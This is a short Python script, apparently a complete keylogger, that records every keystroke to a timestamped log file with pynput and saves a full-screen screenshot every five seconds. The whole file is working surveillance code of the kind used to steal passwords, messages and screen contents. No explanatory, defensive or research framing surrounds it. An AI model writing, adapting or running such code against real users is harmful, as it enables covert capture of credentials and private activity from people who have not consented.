from pynput.keyboard import Listener
import logging
import time
import pyscreenshot as ImageGrab
import schedule
from datetime import datetime
import threading


# Function to handle key press events
def on_press(key):
    logging.info(str(key))


# Function to start keylogger
def start_keylogger():
    logging.basicConfig(filename="keyLog.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
    with Listener(on_press=on_press) as listener:
        listener.join()


# Function to take screenshot
def take_screenshot():
    print("Taking screenshot...")

    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    image_name = f"screenshot_{timestamp}"
    filepathloc = f"screenshots/{image_name}.png"

    screenshot = ImageGrab.grab()
    screenshot.save(filepathloc)

    print(f"Screenshot {image_name} save at {filepathloc}")

    return filepathloc


def main():
    print("Starting the program...")
    keylogger_thread = threading.Thread(target=start_keylogger)
    keylogger_thread.start()

    # Schedule taking screenshots every 5 seconds
    schedule.every(5).seconds.do(take_screenshot)
    while True:
        schedule.run_pending()
        time.sleep(1)


if __name__ == '__main__':
    main()
